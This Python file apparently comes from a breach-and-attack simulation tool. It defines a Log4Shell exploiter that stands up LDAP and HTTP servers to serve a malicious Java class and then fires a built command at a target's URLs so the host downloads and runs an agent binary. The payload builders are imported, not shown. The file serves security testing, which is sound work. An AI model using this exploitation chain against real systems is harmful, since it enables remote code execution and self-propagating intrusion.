import logging
from typing import Callable, Sequence, Set

from common import OperatingSystem
from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.types import AgentID, Event, NetworkPort
from infection_monkey.exploit import IAgentOTPProvider
from infection_monkey.exploit.log4shell_utils import (
    LINUX_EXPLOIT_TEMPLATE_PATH,
    WINDOWS_EXPLOIT_TEMPLATE_PATH,
    ExploitClassHTTPServer,
    LDAPExploitServer,
    build_exploit_bytecode,
)
from infection_monkey.exploit.tools import HTTPBytesServer
from infection_monkey.exploit.tools.web_tools import build_urls
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.network import TCPPortSelector
from infection_monkey.network.tools import get_interface_to_target
from infection_monkey.utils.monkey_dir import get_monkey_dir_path
from infection_monkey.utils.threading import interruptible_iter

from .log4shell_command_builder import build_log4shell_command
from .log4shell_options import Log4ShellOptions

logger = logging.getLogger(__name__)


class Placeholder_Log4ShellExploitClient:
    def __init__(self, *args, **kwargs):
        pass


SERVER_SHUTDOWN_TIMEOUT = LONG_REQUEST_TIMEOUT

AgentBinaryServerFactory = Callable[[TargetHost], HTTPBytesServer]


class Log4ShellExploiter:
    def __init__(
        self,
        agent_id: AgentID,
        host: TargetHost,
        log4shell_exploit_client: Placeholder_Log4ShellExploitClient,
        tcp_port_selector: TCPPortSelector,
        start_agent_binary_server: AgentBinaryServerFactory,
        otp_provider: IAgentOTPProvider,
    ):
        self._agent_id = agent_id
        self._host = host
        self._log4shell_exploit_client = log4shell_exploit_client
        self._tcp_port_selector = tcp_port_selector
        self._start_agent_binary_server = start_agent_binary_server
        self._otp_provider = otp_provider

    def _configure_servers(self):
        self._ldap_port = self._tcp_port_selector.get_free_tcp_port()

        self._class_http_server_ip = get_interface_to_target(str(self._host.ip))
        self._class_http_server_port = self._tcp_port_selector.get_free_tcp_port()

        self._ldap_server = None
        self._exploit_class_http_server = None
        self._agent_http_server_thread = None

    def _start_class_http_server(self, command: str):
        java_class = self._build_java_class(command)

        self._exploit_class_http_server = ExploitClassHTTPServer(
            self._class_http_server_ip, self._class_http_server_port, java_class
        )
        self._exploit_class_http_server.run()

    def _build_java_class(self, exploit_command: str) -> bytes:
        if OperatingSystem.LINUX == self._host.operating_system:
            return build_exploit_bytecode(exploit_command, LINUX_EXPLOIT_TEMPLATE_PATH)
        else:
            return build_exploit_bytecode(exploit_command, WINDOWS_EXPLOIT_TEMPLATE_PATH)

    def _start_ldap_server(self):
        self._ldap_server = LDAPExploitServer(
            ldap_server_port=self._ldap_port,
            http_server_ip=self._class_http_server_ip,
            http_server_port=self._class_http_server_port,
            storage_dir=get_monkey_dir_path(),
        )
        self._ldap_server.run()

    def _stop_servers(self):
        logger.debug("Stopping all LDAP and HTTP Servers")

        self._exploit_class_http_server.stop(SERVER_SHUTDOWN_TIMEOUT)

        self._ldap_server.stop(SERVER_SHUTDOWN_TIMEOUT)

    def exploit_host(
        self,
        target_host: TargetHost,
        ports_to_exploit: Set[NetworkPort],
        servers: Sequence[str],
        current_depth: int,
        options: Log4ShellOptions,
        interrupt: Event,
    ) -> ExploiterResultData:
        logger.info(f"Starting Log4Shell exploiter for host: {target_host.ip}")

        # Try to get potential urls
        potential_urls = _build_potential_urls(target_host, ports_to_exploit)
        if not potential_urls:
            msg = f"No potential URLs found for host: {target_host.ip}"
            logger.debug(msg)
            return ExploiterResultData(error_message=msg)

        try:
            logger.debug("Starting the agent binary server")
            agent_binary_http_server = self._start_agent_binary_server(target_host)
        except Exception as err:
            msg = (
                "An unexpected exception occurred while attempting to start the agent binary HTTP "
                f"server: {err}"
            )
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        command = build_log4shell_command(
            self._agent_id,
            target_host,
            servers,
            current_depth,
            agent_binary_http_server.download_url,
            self._otp_provider.get_otp(),
        )

        # Start http server to serve malicious java class to victim
        self._start_class_http_server(command)

        # Start ldap server to redirect ldap query to java class server
        self._start_ldap_server()

        try:
            logger.debug(
                f"Running Log4Shell command against potential URLs for host: {target_host.ip}"
            )
            return self._exploit_urls(
                target_host,
                options,
                agent_binary_http_server.bytes_downloaded,
                interrupt,
                potential_urls,
                command,
            )
        except Exception as err:
            msg = (
                "An unexpected exception occurred while attempting to exploit the host "
                f'"{target_host.ip}" with the Log4Shell exploiter: {err}'
            )
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)
        finally:
            _stop_agent_binary_http_server(
                agent_binary_http_server, options.agent_binary_download_timeout
            )
            self._stop_servers()

    def _exploit_urls(
        self,
        target_host: TargetHost,
        options: Log4ShellOptions,
        agent_binary_downloaded: Event,
        interrupt: Event,
        urls: Sequence[str],
        command: str,
    ) -> ExploiterResultData:
        """
        Attempt to exploit on all URLs
        """
        exploit_result = ExploiterResultData()

        for url in interruptible_iter(urls, interrupt):
            logger.debug(f"Attempting to exploit host: {target_host.ip} with URL: {url}")
            (
                exploit_result.exploitation_success,
                exploit_result.propagation_success,
            ) = self._log4shell_exploit_client.exploit(
                target_host, options, agent_binary_downloaded, url, command
            )

            if exploit_result.exploitation_success is True:
                break

        return exploit_result


def _build_potential_urls(
    target_host: TargetHost, ports_to_exploit: Set[NetworkPort]
) -> Sequence[str]:
    potential_urls = build_urls(str(target_host.ip), [(str(p), False) for p in ports_to_exploit])
    logger.debug(f"Potential URLs: {potential_urls}")

    return potential_urls


def _stop_agent_binary_http_server(
    agent_binary_http_server: HTTPBytesServer, agent_binary_download_timeout: float
):
    try:
        logger.debug("Stopping the agent binary server")
        agent_binary_http_server.stop(agent_binary_download_timeout)
    except Exception:
        logger.exception("An unexpected error occurred while stopping the HTTP server")
